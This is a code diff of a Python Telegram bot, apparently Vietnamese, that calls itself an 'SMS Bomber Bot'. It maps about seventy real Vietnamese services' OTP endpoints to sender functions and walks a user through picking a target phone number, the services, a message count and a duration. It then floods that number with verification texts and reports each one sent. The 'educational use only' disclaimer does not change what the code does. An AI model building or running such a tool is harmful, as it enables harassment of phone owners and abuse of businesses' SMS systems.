@@ -1,52 +1,63 @@
-import telebot
-from telebot.types import Message
-from flask import Flask, request
-import threading
-import os
 import asyncio
-import aiohttp
-import time
-from time import sleep
-import sys
-from colorama import Fore, Back, Style
+import logging
+from datetime import datetime
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.storage.memory import MemoryStorage
+import threading
 import random
-import requests  # Giữ cho tương thích nếu cần, nhưng ưu tiên aiohttp
-import json
-from datetime import datetime, timedelta
 import string
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
-from threading import BoundedSemaphore
-import concurrent.futures  # Giữ nếu cần fallback, nhưng dùng asyncio chính
+import requests
+import json
 
-# Các biến global từ code gốc
-MAX_THREADS = 18  # Không dùng nữa vì chuyển async, nhưng giữ
-semaphore = BoundedSemaphore(MAX_THREADS)  # Không dùng
+# ==================== CẤU HÌNH ====================
+API_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
+ADMIN_IDS = [123456789]  # Thay bằng ID Telegram của admin
+MAX_THREADS = 18
+MAX_ATTACKS_PER_USER = 10  # Giới hạn số cuộc tấn công mỗi user
+ATTACK_COOLDOWN = 60  # Thời gian chờ giữa các lần tấn công (giây)
 
-# Danh sách tên
-last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
-middle_names = ['Vân', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
-first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']
+# ==================== LOGGING ====================
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
+# ==================== STATE MANAGEMENT ====================
+class AttackStates(StatesGroup):
+    waiting_for_phone = State()
+    waiting_for_service = State()
+    waiting_for_count = State()
+    waiting_for_duration = State()
+
+# ==================== USER MANAGEMENT ====================
+user_attacks = {}
+user_cooldowns = {}
+
+# ==================== BOT INIT ====================
+bot = Bot(token=API_TOKEN)
+storage = MemoryStorage()
+dp = Dispatcher(storage=storage)
+
+# ==================== UTILITY FUNCTIONS ====================
 def generate_random_name():
+    last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
+    middle_names = ['Vân', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
+    first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']
+    
     last_name = random.choice(last_names)
     middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
     first_name = random.choice(first_names)
     return f"{last_name} {middle_name} {first_name}".strip()
 
 def generate_random_id():
-    def random_segment(length):
-        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
-    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"
-
-def generate_random_id():  # Overwrite nếu cần
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))
 
 def format_device_id(device_id):
     return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"
 
-random_id = generate_random_id()
-formatted_device_id = format_device_id(random_id)
+# ==================== SMS FUNCTIONS ====================
 
 def send_otp_via_sapo(sdt):
     cookies = {
@@ -3189,145 +3200,481 @@ def send_otp_via_takomo(sdt):
     response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)
 
     print("OTP SEND :", response_post.text)
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
 
-##################################################################################################################################################################################
+# ==================== SERVICE MAPPING ====================
+SMS_SERVICES = {
 
+ "sapo": send_otp_via_sapo,
+    "viettel": send_otp_via_viettel,
+    "medicare": send_otp_via_medicare,
+    "tv360": send_otp_via_tv360,
+    "dienmayxanh": send_otp_via_dienmayxanh,
+    "kingfoodmart": send_otp_via_kingfoodmart,
+    "mocha": send_otp_via_mocha,
+    "fptdk": send_otp_via_fptdk,
+    "fptmk": send_otp_via_fptmk,
+    "vieon": send_otp_via_VIEON,
+    "ghn": send_otp_via_ghn,
+    "lottemart": send_otp_via_lottemart,
+    "dongcre": send_otp_via_DONGCRE,
+    "shopee": send_otp_via_shopee,
+    "tgdd": send_otp_via_TGDD,
+    "fptshop": send_otp_via_fptshop,
+    "winmart": send_otp_via_WinMart,
+    "vietloan": send_otp_via_vietloan,
+    "lozi": send_otp_via_lozi,
+    "f88": send_otp_via_F88,
+    "spacet": send_otp_via_spacet,
+    "vinpearl": send_otp_via_vinpearl,
+    "traveloka": send_otp_via_traveloka,
+    "dongplus": send_otp_via_dongplus,
+    "longchau": send_otp_via_longchau,
+    "longchau1": send_otp_via_longchau1,
+    "galaxyplay": send_otp_via_galaxyplay,
+    "emartmall": send_otp_via_emartmall,
+    "ahamove": send_otp_via_ahamove,
+    "viettelmoney": send_otp_via_ViettelMoney,
+    "xanhsmsms": send_otp_via_xanhsmsms,
+    "xanhsmzalo": send_otp_via_xanhsmzalo,
+    "popeyes": send_otp_via_popeyes,
+    "acheckin": send_otp_via_ACHECKIN,
+    "appota": send_otp_via_APPOTA,
+    "watsons": send_otp_via_Watsons,
+    "hoangphuc": send_otp_via_hoangphuc,
+    "fmcomvn": send_otp_via_fmcomvn,
+    "reebokvn": send_otp_via_Reebokvn,
+    "thefaceshop": send_otp_via_thefaceshop,
+    "beautybox": send_otp_via_BEAUTYBOX,
+    "futabus": send_otp_via_futabus,
+    "viettelpost": send_otp_via_ViettelPost,
+    "myviettel2": send_otp_via_myviettel2,
+    "myviettel3": send_otp_via_myviettel3,
+    "tokyolife": send_otp_via_TOKYOLIFE,
+    "30shine": send_otp_via_30shine,
+    "cathaylife": send_otp_via_Cathaylife,
+    "dominos": send_otp_via_dominos,
+    "vinamilk": send_otp_via_vinamilk,
+    "vietloan2": send_otp_via_vietloan2,
+    "batdongsan": send_otp_via_batdongsan,
+    "gumac": send_otp_via_GUMAC,
+    "mutosi": send_otp_via_mutosi,
+    "mutosi1": send_otp_via_mutosi1,
+    "vietair": send_otp_via_vietair,
+    "fahasa": send_otp_via_FAHASA,
+    "hopiness": send_otp_via_hopiness,
+    "modcha35": send_otp_via_modcha35,
+    "bibabo": send_otp_via_Bibabo,
+    "moca": send_otp_via_MOCA,
+    "pantio": send_otp_via_pantio,
+    "routine": send_otp_via_Routine,
+    "vayvnd": send_otp_via_vayvnd,
+    "tima": send_otp_via_tima,
+    "moneygo": send_otp_via_moneygo,
+    "takomo": send_otp_via_takomo,
+    "paynet": send_otp_via_paynet,
+    "pico": send_otp_via_pico,
+    "pnj": send_otp_via_PNJ,
+    "tiniworld": send_otp_via_TINIWORLD,
+}
 
-import concurrent.futures  # Import module cần thiết
-import time
+ALL_SERVICES = list(SMS_SERVICES.keys())
 
-# ... (các hàm send_otp_via_... đã được định nghĩa ở trên)
-
-def run(phone, i):
-    functions = [
-        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
-        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
-        send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
-        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
-        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
-        send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
-        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
-        send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
-        send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
-        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
-        send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
-        send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
-        send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
-        send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
-        send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
-        send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
-        send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
-        send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
-    ]
-
-    # Giới hạn concurrent: 100 (có thể tăng/giảm để test tốc độ và tránh block)
-    sem = asyncio.Semaphore(100)
-    async with aiohttp.ClientSession() as session:
-        async def sem_task(fn):
-            async with sem:
-                await fn(session, phone)
+# ==================== ATTACK FUNCTIONS ====================
+def run_sms_attack(phone, service, count, duration, message):
+    """Chạy tấn công SMS"""
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        tasks = [sem_task(fn) for fn in functions]
-        await asyncio.gather(*tasks, return_exceptions=True)
-
-    print("Spam thành công lần :", i)
-    await asyncio.sleep(2)  # Giảm sleep để nhanh hơn, nhưng có thể tăng nếu cần tránh block
-
-# Phần bot Telegram với webhook
-app = Flask(__name__)
-TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
-if not TOKEN or ':' not in TOKEN:
-    raise ValueError("Invalid or missing TELEGRAM_BOT_TOKEN environment variable")
-
-bot = telebot.TeleBot(TOKEN)
-
-# Biến để quản lý spam tasks
-spam_tasks = {}  # key: chat_id, value: {'task': asyncio.Task, 'running': True}
-
-@bot.message_handler(commands=['start'])
-def start(message: Message):
-    bot.reply_to(message, "Chào! Sử dụng /spam <số điện thoại> <số lần> để bắt đầu.")
-
-@bot.message_handler(commands=['help'])
-def help_command(message: Message):
-    bot.reply_to(message, "Lệnh: /spam <phone> <count> | /stop để dừng")
-
-@bot.message_handler(commands=['spam'])
-def spam_handler(message):
-    args = message.text.split()[1:]
-    if len(args) != 2:
-        bot.reply_to(message, "Usage: /spam <phone> <count>")
-        return
-    phone = args[0]
-    try:
-        count = int(args[1])
-    except ValueError:
-        bot.reply_to(message, "Count phải là số nguyên.")
-        return
-
-    chat_id = message.chat.id
-    if chat_id in spam_tasks and spam_tasks[chat_id]['running']:
-        bot.reply_to(message, "Đang có spam chạy. Dùng /stop để dừng trước.")
-        return
-
-    bot.reply_to(message, f"Bắt đầu spam đến {phone} {count} lần. Dùng /stop để dừng.")
-
-    # Chạy async task
-    loop = asyncio.get_event_loop()
-    task = loop.create_task(run_spam(phone, count, chat_id))
-    spam_tasks[chat_id] = {'task': task, 'running': True}
-
-async def run_spam(phone, count, chat_id):
-    try:
-        for i in range(1, count + 1):
-            if not spam_tasks.get(chat_id, {}).get('running', True):
-                print("Spam stopped by user.")
-                break
-            await run(phone, i)
-        bot.send_message(chat_id, "Hoàn thành hoặc đã dừng spam!")
+        async def send_updates():
+            sent_count = 0
+            start_time = datetime.now()
+            
+            while (datetime.now() - start_time).seconds < duration and sent_count < count:
+                if service == "all":
+                    # Gửi đến tất cả dịch vụ
+                    for service_name, service_func in SMS_SERVICES.items():
+                        if service_func(phone):
+                            sent_count += 1
+                            await bot.send_message(
+                                message.chat.id,
+                                f"✅ Đã gửi OTP #{sent_count} qua {service_name} đến {phone}"
+                            )
+                else:
+                    # Gửi đến dịch vụ cụ thể
+                    if SMS_SERVICES[service](phone):
+                        sent_count += 1
+                        await bot.send_message(
+                            message.chat.id,
+                            f"✅ Đã gửi OTP #{sent_count} qua {service} đến {phone}"
+                        )
+                
+                await asyncio.sleep(1)  # Chờ 1 giây giữa các lần gửi
+            
+            # Kết thúc tấn công
+            await bot.send_message(
+                message.chat.id,
+                f"🎯 Tấn công hoàn tất!\n"
+                f"📱 Số điện thoại: {phone}\n"
+                f"📊 Đã gửi: {sent_count} tin nhắn\n"
+                f"⏱️ Thời gian: {duration} giây\n"
+                f"🕒 Hoàn thành lúc: {datetime.now().strftime('%H:%M:%S')}"
+            )
+        
+        loop.run_until_complete(send_updates())
+        loop.close()
+        
     except Exception as e:
-        bot.send_message(chat_id, f"Lỗi: {str(e)}")
-    finally:
-        if chat_id in spam_tasks:
-            spam_tasks[chat_id]['running'] = False
+        logger.error(f"Lỗi trong tấn công: {e}")
 
-@bot.message_handler(commands=['stop'])
-def stop(message):
-    chat_id = message.chat.id
-    if chat_id in spam_tasks and spam_tasks[chat_id]['running']:
-        spam_tasks[chat_id]['running'] = False
-        spam_tasks[chat_id]['task'].cancel()
-        bot.reply_to(message, "Đã yêu cầu dừng spam. Chờ vài giây để hoàn tất.")
-    else:
-        bot.reply_to(message, "Không có spam đang chạy.")
+# ==================== TELEGRAM HANDLERS ====================
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    """Handler cho lệnh /start"""
+    welcome_text = """
+    🤖 *Chào mừng đến với SMS Bomber Bot* 🤖
 
-# Route cho webhook
-@app.route('/' + TOKEN, methods=['POST'])
-def webhook():
-    if request.headers.get('content-type') == 'application/json':
-        json_string = request.get_data().decode('utf-8')
-        update = telebot.types.Update.de_json(json_string)
-        bot.process_new_updates([update])
-        return '', 200
-    else:
-        return '', 403
+    📱 *Tính năng chính:*
+    • Gửi OTP hàng loạt đến số điện thoại
+    • Hỗ trợ đa dịch vụ Việt Nam
+    • Tùy chỉnh số lượng và thời gian
+    
+    ⚠️ *Lưu ý quan trọng:*
+    • Chỉ sử dụng cho mục đích giáo dục
+    • Không lạm dụng spam
+    • Tuân thủ pháp luật
+    
+    📝 *Các lệnh có sẵn:*
+    /attack - Bắt đầu tấn công SMS
+    /services - Xem danh sách dịch vụ
+    /stats - Thống kê tấn công
+    /help - Trợ giúp sử dụng
+    """
+    
+    await message.answer(welcome_text, parse_mode="Markdown")
 
-@app.route('/')
-def home():
-    return "Bot Telegram đang chạy!"
+@dp.message(Command("help"))
+async def cmd_help(message: types.Message):
+    """Handler cho lệnh /help"""
+    help_text = """
+    📖 *Hướng dẫn sử dụng Bot* 📖
 
-if __name__ == '__main__':
-    # Xóa webhook cũ nếu có
-    bot.remove_webhook()
-    # Set webhook mới (thay bằng URL Render của bạn)
-    bot.set_webhook(url='https://spamsmscode.onrender.com/' + TOKEN)
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    1️⃣ *Bắt đầu tấn công:*
+       Gõ /attack và làm theo hướng dẫn
+
+    2️⃣ *Các bước thực hiện:*
+       • Nhập số điện thoại (84/0)
+       • Chọn dịch vụ hoặc "all"
+       • Nhập số lượng tin nhắn
+       • Nhập thời gian tấn công (giây)
+
+    3️⃣ *Lệnh khác:*
+       /services - Danh sách dịch vụ hỗ trợ
+       /stats - Thống kê cá nhân
+       /cancel - Hủy tấn công hiện tại
+
+    ⚠️ *Giới hạn:*
+       • Tối đa 10 cuộc tấn công/người
+       • Cooldown 60 giây giữa các lần
+    """
+    
+    await message.answer(help_text, parse_mode="Markdown")
+
+@dp.message(Command("services"))
+async def cmd_services(message: types.Message):
+    """Hiển thị danh sách dịch vụ"""
+    services_text = "📋 *Danh sách dịch vụ hỗ trợ:*\n\n"
+    
+    # Chia thành các nhóm 5 dịch vụ
+    services_list = list(SMS_SERVICES.keys())
+    for i in range(0, len(services_list), 5):
+        services_text += " • " + "\n • ".join(services_list[i:i+5]) + "\n\n"
+    
+    services_text += "🔹 Gõ 'all' để gửi đến tất cả dịch vụ"
+    
+    await message.answer(services_text, parse_mode="Markdown")
+
+@dp.message(Command("stats"))
+async def cmd_stats(message: types.Message):
+    """Hiển thị thống kê"""
+    user_id = message.from_user.id
+    attack_count = user_attacks.get(user_id, 0)
+    
+    stats_text = f"""
+    📊 *Thống kê của bạn* 📊
+
+    👤 User ID: `{user_id}`
+    🎯 Số lần tấn công: {attack_count}
+    ⏳ Cooldown: {'Đang chờ' if user_id in user_cooldowns else 'Sẵn sàng'}
+    
+    📈 Giới hạn: {MAX_ATTACKS_PER_USER} lần/người
+    ⚡ Cooldown: {ATTACK_COOLDOWN} giây
+    """
+    
+    await message.answer(stats_text, parse_mode="Markdown")
+
+@dp.message(Command("attack"))
+async def cmd_attack(message: types.Message, state: FSMContext):
+    """Bắt đầu quy trình tấn công"""
+    user_id = message.from_user.id
+    
+    # Kiểm tra cooldown
+    if user_id in user_cooldowns:
+        remaining = user_cooldowns[user_id] - datetime.now().timestamp()
+        if remaining > 0:
+            await message.answer(f"⏳ Vui lòng chờ {int(remaining)} giây trước khi tấn công tiếp!")
+            return
+    
+    # Kiểm tra giới hạn
+    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_USER:
+        await message.answer("🚫 Bạn đã đạt giới hạn tấn công hôm nay!")
+        return
+    
+    await state.set_state(AttackStates.waiting_for_phone)
+    await message.answer(
+        "📱 *Vui lòng nhập số điện thoại:*\n\n"
+        "• Định dạng: 84912345678 hoặc 0912345678\n"
+        "• Gõ /cancel để hủy",
+        parse_mode="Markdown"
+    )
+
+@dp.message(Command("cancel"))
+async def cmd_cancel(message: types.Message, state: FSMContext):
+    """Hủy tấn công"""
+    current_state = await state.get_state()
+    if current_state is None:
+        await message.answer("❌ Không có tấn công nào đang diễn ra!")
+        return
+    
+    await state.clear()
+    await message.answer("✅ Đã hủy tấn công!")
+
+# ==================== PHONE NUMBER HANDLER ====================
+@dp.message(AttackStates.waiting_for_phone)
+async def process_phone(message: types.Message, state: FSMContext):
+    """Xử lý số điện thoại"""
+    phone = message.text.strip()
+    
+    # Validate số điện thoại
+    if not (phone.startswith('84') or phone.startswith('0')) or len(phone) < 9:
+        await message.answer("❌ Số điện thoại không hợp lệ!\nVui lòng nhập lại:")
+        return
+    
+    # Chuyển đổi về định dạng 84
+    if phone.startswith('0'):
+        phone = '84' + phone[1:]
+    
+    await state.update_data(phone=phone)
+    await state.set_state(AttackStates.waiting_for_service)
+    
+    # Tạo keyboard chọn dịch vụ
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Tất cả dịch vụ", callback_data="all")],
+        [InlineKeyboardButton(text="Chọn dịch vụ cụ thể", callback_data="select")],
+        [InlineKeyboardButton(text="Hủy", callback_data="cancel")]
+    ])
+    
+    await message.answer(
+        f"📱 Số điện thoại: `{phone}`\n\n"
+        "🔧 *Chọn phương thức tấn công:*",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+# ==================== SERVICE SELECTION HANDLER ====================
+@dp.callback_query(AttackStates.waiting_for_service)
+async def process_service(callback: types.CallbackQuery, state: FSMContext):
+    """Xử lý chọn dịch vụ"""
+    service = callback.data
+    
+    if service == "cancel":
+        await state.clear()
+        await callback.message.edit_text("✅ Đã hủy tấn công!")
+        return
+    
+    if service == "select":
+        # Hiển thị danh sách dịch vụ để chọn
+        services_text = "📋 Chọn dịch vụ:\n"
+        for svc in ALL_SERVICES[:10]:  # Hiển thị 10 dịch vụ đầu
+            services_text += f"\n`{svc}`"
+        
+        await callback.message.edit_text(
+            services_text + "\n\n📝 *Gõ tên dịch vụ:*",
+            parse_mode="Markdown"
+        )
+        return
+    
+    await state.update_data(service=service)
+    await state.set_state(AttackStates.waiting_for_count)
+    
+    await callback.message.edit_text(
+        "🔢 *Nhập số lượng tin nhắn:*\n\n"
+        "• Tối đa: 100 tin\n"
+        "• Gõ số từ 1-100",
+        parse_mode="Markdown"
+    )
+
+@dp.message(AttackStates.waiting_for_service)
+async def process_service_name(message: types.Message, state: FSMContext):
+    """Xử lý tên dịch vụ được nhập"""
+    service = message.text.strip().lower()
+    
+    if service not in ALL_SERVICES and service != "all":
+        await message.answer("❌ Dịch vụ không tồn tại!\nVui lòng nhập lại:")
+        return
+    
+    await state.update_data(service=service)
+    await state.set_state(AttackStates.waiting_for_count)
+    
+    await message.answer(
+        "🔢 *Nhập số lượng tin nhắn:*\n\n"
+        "• Tối đa: 100 tin\n"
+        "• Gõ số từ 1-100",
+        parse_mode="Markdown"
+    )
+
+# ==================== COUNT HANDLER ====================
+@dp.message(AttackStates.waiting_for_count)
+async def process_count(message: types.Message, state: FSMContext):
+    """Xử lý số lượng tin nhắn"""
+    try:
+        count = int(message.text.strip())
+        if count < 1 or count > 100:
+            await message.answer("❌ Số lượng phải từ 1-100!\nVui lòng nhập lại:")
+            return
+    except ValueError:
+        await message.answer("❌ Vui lòng nhập số hợp lệ!")
+        return
+    
+    await state.update_data(count=count)
+    await state.set_state(AttackStates.waiting_for_duration)
+    
+    await message.answer(
+        "⏱️ *Nhập thời gian tấn công (giây):*\n\n"
+        "• Tối đa: 300 giây (5 phút)\n"
+        "• Gõ số từ 10-300",
+        parse_mode="Markdown"
+    )
+
+# ==================== DURATION HANDLER ====================
+@dp.message(AttackStates.waiting_for_duration)
+async def process_duration(message: types.Message, state: FSMContext):
+    """Xử lý thời gian tấn công"""
+    try:
+        duration = int(message.text.strip())
+        if duration < 10 or duration > 300:
+            await message.answer("❌ Thời gian phải từ 10-300 giây!\nVui lòng nhập lại:")
+            return
+    except ValueError:
+        await message.answer("❌ Vui lòng nhập số hợp lệ!")
+        return
+    
+    # Lấy tất cả dữ liệu
+    data = await state.get_data()
+    phone = data['phone']
+    service = data['service']
+    count = data['count']
+    
+    # Cập nhật thống kê
+    user_id = message.from_user.id
+    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
+    user_cooldowns[user_id] = datetime.now().timestamp() + ATTACK_COOLDOWN
+    
+    # Xóa state
+    await state.clear()
+    
+    # Hiển thị thông tin tấn công
+    attack_info = f"""
+    🚀 *Bắt đầu tấn công!* 🚀
+
+    📱 Số điện thoại: `{phone}`
+    🔧 Dịch vụ: `{service}`
+    🔢 Số lượng: {count} tin
+    ⏱️ Thời gian: {duration} giây
+    🕒 Bắt đầu: {datetime.now().strftime('%H:%M:%S')}
+
+    ⚡ *Đang gửi tin nhắn...*
+    """
+    
+    await message.answer(attack_info, parse_mode="Markdown")
+    
+    # Chạy tấn công trong thread riêng
+    thread = threading.Thread(
+        target=run_sms_attack,
+        args=(phone, service, count, duration, message)
+    )
+    thread.start()
+
+# ==================== ADMIN COMMANDS ====================
+@dp.message(Command("admin"))
+async def cmd_admin(message: types.Message):
+    """Lệnh admin"""
+    if message.from_user.id not in ADMIN_IDS:
+        await message.answer("🚫 Bạn không có quyền truy cập!")
+        return
+    
+    admin_text = """
+    👑 *Admin Panel* 👑
+
+    /admin_stats - Thống kê hệ thống
+    /admin_users - Danh sách người dùng
+    /admin_clear - Xóa dữ liệu
+    /admin_broadcast - Gửi thông báo
+    """
+    
+    await message.answer(admin_text, parse_mode="Markdown")
+
+@dp.message(Command("admin_stats"))
+async def cmd_admin_stats(message: types.Message):
+    """Thống kê hệ thống"""
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    
+    total_attacks = sum(user_attacks.values())
+    active_users = len(user_attacks)
+    
+    stats_text = f"""
+    📈 *Thống kê hệ thống* 📈
+
+    👥 Tổng người dùng: {active_users}
+    🎯 Tổng cuộc tấn công: {total_attacks}
+    ⚡ Dịch vụ hỗ trợ: {len(SMS_SERVICES)}
+    
+    📊 Top người dùng:
+    """
+    
+    # Sắp xếp người dùng theo số lần tấn công
+    sorted_users = sorted(user_attacks.items(), key=lambda x: x[1], reverse=True)[:5]
+    
+    for i, (user_id, attacks) in enumerate(sorted_users, 1):
+        stats_text += f"\n{i}. User {user_id}: {attacks} lần"
+    
+    await message.answer(stats_text, parse_mode="Markdown")
+
+# ==================== ERROR HANDLER ====================
+@dp.errors()
+async def error_handler(event: types.ErrorEvent):
+    """Xử lý lỗi"""
+    logger.error(f"Lỗi: {event.exception}")
+    
+    try:
+        await event.update.message.answer(
+            "❌ Đã xảy ra lỗi!\n"
+            "Vui lòng thử lại sau hoặc liên hệ admin."
+        )
+    except:
+        pass
+
+# ==================== MAIN FUNCTION ====================
+async def main():
+    """Hàm chính"""
+    logger.info("🤖 Khởi động SMS Bomber Bot...")
+    
+    # Xóa webhook cũ
+    await bot.delete_webhook(drop_pending_updates=True)
+    
+    # Khởi động bot
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
